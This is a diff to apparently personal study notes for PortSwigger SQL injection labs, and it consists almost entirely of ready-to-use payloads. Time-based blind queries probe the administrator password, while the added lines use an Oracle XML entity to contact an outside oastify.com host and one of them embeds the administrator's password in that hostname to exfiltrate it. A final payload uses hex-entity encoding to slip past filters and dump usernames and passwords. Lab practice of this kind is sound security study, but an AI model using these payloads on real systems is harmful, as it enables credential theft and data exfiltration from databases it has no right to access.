@@ -57,6 +57,12 @@ AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END) IS NULL -- -
 -- Blind SQL injection with time delays and information retrieval
 AND (SELECT CASE WHEN (LENGTH(password)=20) THEN pg_sleep(10) ELSE NULL END FROM users WHERE username='administrator') IS NULL -- -
 AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='1') THEN pg_sleep(10) ELSE NULL END FROM users WHERE username='administrator') IS NULL -- -
+-- Blind SQL injection with out-of-band interaction
+UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://j0knga2di90fioeb8ob35jtkpbv2jw7l.oastify.com/"> %remote;]>'),'/l') FROM dual -- -
+-- Blind SQL injection with out-of-band data exfiltration
+UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.g0hkg72ai60cile88lb05gthp8vzju7j.oastify.com/"> %remote;]>'),'/l') FROM dual-- -
+-- SQL injection with filter bypass via XML encoding
+<@hex_entities>1 UNION SELECT username || ':' || password from users</@hex_entities>
 ```
 
 - Solver for Blind SQL injection with conditional responses can be found [here](/assets/solutions/portswigger/conditional_responses.py).
